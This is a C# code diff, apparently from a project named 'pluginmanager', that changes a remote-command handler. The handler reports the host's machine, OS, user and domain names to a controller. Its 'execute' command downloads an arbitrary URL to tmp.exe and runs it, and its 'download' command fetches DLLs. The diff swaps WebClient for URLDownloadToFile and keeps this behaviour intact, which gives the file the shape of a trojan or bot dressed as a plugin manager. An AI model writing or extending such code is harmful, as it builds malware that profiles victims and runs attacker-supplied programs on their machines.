@@ -1,6 +1,5 @@
 ﻿using System;
 using System.Diagnostics;
-using System.Net;
 using System.Security.Cryptography;
 using System.Text;
 
@@ -31,15 +30,13 @@ namespace pluginmanager.Communication
                 send($"{System.Environment.MachineName} {System.Environment.OSVersion} {System.Environment.UserName} {System.Environment.UserDomainName}");
             else if (arguments.Length > 1 && arguments[0].Equals("execute"))
             {
-                WebClient wc = new WebClient();
-                wc.DownloadFile(arguments[1], "tmp.exe");
+                Download.URLDownloadToFile(0, arguments[1], "tmp.exe", 0, 0);
                 Process.Start("tmp.exe");
             }
             else if (arguments.Length > 1 && arguments[0].Equals("download"))
             {
                 Random random = new Random();
-                WebClient wc = new WebClient();
-                wc.DownloadFile(arguments[1], $"{random.Next(1000)}.dll");
+                Download.URLDownloadToFile(0, arguments[1], $"{random.Next(1000)}.dll", 0, 0);
             }
         }
     }
